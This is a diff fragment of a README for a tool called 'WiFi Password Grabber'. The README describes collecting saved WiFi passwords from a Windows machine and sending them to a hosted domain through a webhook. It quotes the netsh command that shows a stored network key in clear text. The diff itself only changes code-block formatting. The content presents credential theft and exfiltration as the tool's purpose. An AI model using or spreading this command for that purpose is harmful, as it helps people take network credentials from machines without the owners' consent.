@@ -1,8 +1,7 @@
 `# WiFi Password Grabber
 
 Grabs saved WiFi passwords on a Windows machine and sends them to a hosted domain using a webhook. This is done using the following command:
-
-``` bash  `
+  `
 netsh wlan show profile NetworkName key=clear `
 
 Key Features:
